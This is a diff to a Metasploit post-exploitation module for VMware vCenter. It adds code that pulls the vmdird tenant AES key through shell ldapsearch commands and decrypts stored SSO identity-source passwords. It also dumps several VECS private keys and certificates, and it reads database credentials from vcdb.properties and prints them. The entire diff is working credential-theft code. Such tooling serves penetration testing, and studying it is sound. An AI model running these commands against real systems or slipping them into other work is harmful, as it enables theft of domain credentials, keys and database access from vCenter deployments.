@@ -75,6 +75,7 @@ class MetasploitModule < Msf::Post
     if datastore['DUMP_VMDIR']
       print_status('Extracting vSphere SSO domain information ...')
       vmdir_dump
+
     end
 
     if datastore['DUMP_VMAFD']
@@ -148,6 +149,8 @@ class MetasploitModule < Msf::Post
     }
 
     store_valid_credential(user: @bind_dn, private: @bind_pw, service_data: extra_service_data)
+
+    get_tenant_aes_key
   end
 
   def vmdir_dump
@@ -170,7 +173,7 @@ class MetasploitModule < Msf::Post
     print_good("LDIF Dump: #{p}")
 
     if (rm_f temp_ldif_file)
-      vprint_status("Removed temporary file from vCenter appliance: #{temp_ldif_file}")
+      vprint_good("Removed temporary file from vCenter appliance: #{temp_ldif_file}")
     else
       print_warning("Unable to remove temporary file from vCenter appliance: #{temp_ldif_file}")
     end
@@ -183,32 +186,39 @@ class MetasploitModule < Msf::Post
     entries = ldif_data.to_entries
 
     print_status('Processing SSO account hashes ...')
-    if (vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? })
-      process_hashes(vmware_sso_hash_entries)
-    else
-      print_error('SSO account hashes were not returned with LDIF data')
-    end
+    vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? }
+    process_hashes(vmware_sso_hash_entries)
+
+    print_status('Processing SSO identity sources ...')
+    vmware_sso_id_entries = entries.select { |entry| entry[:vmwSTSConnectionStrings].any? }
+    process_sso_providers(vmware_sso_id_entries)
   end
 
   def vmafd_dump
     get_vmca_cert
     get_idp_cert
 
-    vcenter_machine_key = get_vecs_entry('getkey', 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl')
-    vcenter_machine_cert = get_vecs_entry('getcert', 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl')
+    vecs_targets = [
+      [ 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl' ],
+      [ 'data-encipherment', 'data-encipherment', 'data' ],
+      [ 'vsphere-webclient', 'vsphere-webclient', 'webclient' ],
+      [ 'vpxd', 'vpxd', 'vpxd' ],
+      [ 'vpxd-extension', 'vpxd-extension', 'vpxdext' ]
+    ]
 
-    unless vcenter_machine_cert.check_private_key(vcenter_machine_key)
-      fail_with(Msf::Exploit::Failure::Unknown, 'MACHINE_SSL_CERT certificate and private key mismatch!')
+    vecs_targets.each do |target|
+      next unless (entry_key = get_vecs_entry('getkey', target[0], target[1], target[2]))
+      next unless (entry_cert = get_vecs_entry('getcert', target[0], target[1], target[2]))
+
+      unless entry_cert.check_private_key(entry_key)
+        fail_with(Msf::Exploit::Failure::Unknown, "#{target.upcase} certificate and private key mismatch!")
+      end
+
+      case target[0].downcase
+      when 'data-encipherment'
+        @vc_cipher_key = entry_key
+      end
     end
-
-    vcenter_encipherment_key = get_vecs_entry('getkey', 'data-encipherment', 'data-encipherment', 'data')
-    vcenter_encipherment_cert = get_vecs_entry('getcert', 'data-encipherment', 'data-encipherment', 'data')
-
-    unless vcenter_encipherment_cert.check_private_key(vcenter_encipherment_key)
-      fail_with(Msf::Exploit::Failure::Unknown, 'DATA-ENCIPHERMENT certificate and private key mismatch!')
-    end
-
-    @vc_cipher_key = vcenter_encipherment_key
   end
 
   def get_vmca_cert
@@ -240,7 +250,7 @@ class MetasploitModule < Msf::Post
   # Shamelessly borrowed from vmware_vcenter_vmdir_ldap.rb
   def process_hashes(entries)
     if entries.empty?
-      print_error('No password hashes found')
+      print_warning('No password hashes found')
       return
     end
 
@@ -249,7 +259,7 @@ class MetasploitModule < Msf::Post
       module_fullname: fullname,
       origin_type: :service,
       address: rhost,
-      port: rport,
+      port: '389',
       protocol: 'tcp',
       service_name: 'vmdir/ldap'
     }
@@ -289,6 +299,112 @@ class MetasploitModule < Msf::Post
         jtr_format: identify_hash(john_hash)
       ))
     end
+  end
+
+  def process_sso_providers(entries)
+    if entries.empty?
+      print_warning('No SSO ID provider information found')
+      return
+    end
+
+    if entries.is_a?(String)
+      entries = entries.split("\n")
+    end
+
+    entries.each do |entry|
+      sso_prov_type = entry[:vmwSTSProviderType].first
+      sso_conn_str = entry[:vmwSTSConnectionStrings].first
+      sso_user = entry[:vmwSTSUserName].first
+
+      # On vCenter 7.x instances the tenant AES key was always Base64 encoded vs. plaintext, and vmwSTSPassword was missing from the LDIF dump.
+      # It appears that vCenter 7.x does not return vmwSTSPassword even with appropriate LDAP flags - this is not like prior versions.
+      # The data can still be extracted directly with ldapsearch syntax below which works in all versions, but is a PITA.
+      shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"
+
+      vmdir_user_sso_pass = cmd_exec(shell_cmd).split("\n").last
+      sso_pass = tenant_aes_decrypt(vmdir_user_sso_pass)
+
+      sso_domain = entry[:vmwSTSDomainName].first
+
+      sso_conn_uri = URI.parse(sso_conn_str)
+
+      extra_service_data = {
+        address: Rex::Socket.getaddress(rhost),
+        port: sso_conn_uri.port,
+        service_name: sso_conn_uri.scheme,
+        protocol: 'tcp',
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+        realm_value: sso_domain
+      }
+
+      store_valid_credential(user: sso_user, private: sso_pass, service_data: extra_service_data)
+      print_status('Found SSO Identity Source Credential:')
+      print_good("#{sso_prov_type} @ #{sso_conn_str}:")
+      print_good("SSOUSER: #{sso_user}")
+      print_good("SSOPASS: #{sso_pass}")
+      print_good("SSODOMAIN: #{sso_domain}")
+    end
+  end
+
+  def get_tenant_aes_key
+    # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
+    print_status('Extract vmdird tenant AES encryption keys ...')
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
+
+    tenant_key = cmd_exec(shell_cmd).split("\n").last
+
+    unless tenant_key.include? 'vmwSTSTenantKey'
+      fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant AES encryption key')
+    end
+
+    @vc_tenant_aes_key = tenant_key.split(': ').last.encode('iso-8859-1')
+    case @vc_tenant_aes_key.length
+    when 16
+      vprint_status("vCenter returned a plaintext AES key: #{@vc_tenant_aes_key}")
+      @vc_tenant_aes_key_hex = "0x#{@vc_tenant_aes_key.unpack('H*').first}"
+    when 24
+      vprint_status("vCenter returned a Base64 AES key: #{@vc_tenant_aes_key}")
+      @vc_tenant_aes_key_hex = "0x#{Base64.strict_decode64(@vc_tenant_aes_key).unpack('H*').first}"
+    else
+      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 or 24 bytes, got #{@vc_tenant_aes_key.length}")
+    end
+
+    print_good("vSphere Tenant AES encryption key: #{@vc_tenant_aes_key} hex: #{@vc_tenant_aes_key_hex}")
+
+    extra_service_data = {
+      address: Rex::Socket.getaddress(rhost),
+      port: 389,
+      service_name: 'ldap',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+      realm_value: @base_fqdn
+    }
+
+    store_valid_credential(user: 'AES key', private: @vc_tenant_aes_key, service_data: extra_service_data)
+  end
+
+  def tenant_aes_decrypt(b64)
+    # https://github.com/vmware/lightwave/blob/master/vmidentity/idm/server/src/main/java/com/vmware/identity/idm/server/CryptoAESE.java#L44-L45
+    ciphertext = Base64.strict_decode64(b64)
+    decipher = OpenSSL::Cipher.new('aes-128-ecb')
+    decipher.decrypt
+    decipher.padding = 0
+
+    case @vc_tenant_aes_key.length
+    when 16
+      decipher.key = @vc_tenant_aes_key
+    when 24
+      decipher.key = Base64.strict_decode64(@vc_tenant_aes_key)
+    else
+      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 or 24 bytes, got #{@vc_tenant_aes_key.length}")
+    end
+    (decipher.update(ciphertext) + decipher.final).delete("\000")
   end
 
   def get_idp_cert
@@ -392,6 +508,11 @@ class MetasploitModule < Msf::Post
   def enum_vm_cust_spec
     shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT DISTINCT name FROM vpx_customization_spec;' -P pager -A -t"
     vpx_customization_specs = cmd_exec(shell_cmd).split("\n")
+
+    unless vpx_customization_specs.first
+      print_warning('No vpx_customization_spec entries evident')
+      return
+    end
 
     vpx_customization_specs.each do |spec|
       vprint_status("Processing vpx_customization_spec '#{spec}' ...")
@@ -506,15 +627,14 @@ class MetasploitModule < Msf::Post
   def get_db_creds
     shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep jdbc:postgresql:// | awk -F '/' '{print $4}' | awk -F '?' '{print $1}'"
     @vcdb_name = cmd_exec(shell_cmd)
-    print_good("VCDB Name: #{@vcdb_name}")
 
     shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep username | awk -F '=' '{print $2}'| tr -d ' '"
     @vcdb_user = cmd_exec(shell_cmd)
-    print_good("VCDB User: #{@vcdb_user}")
 
     shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep password | grep -v encrypted | awk -F '=' '{print $2}'| tr -d ' '"
     @vcdb_pass = cmd_exec(shell_cmd)
-    print_good("VCDB PW: #{@vcdb_pass}")
+
+    print_good("VCDB Name: #{@vcdb_name} User: #{@vcdb_user} PW: #{@vcdb_pass}")
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
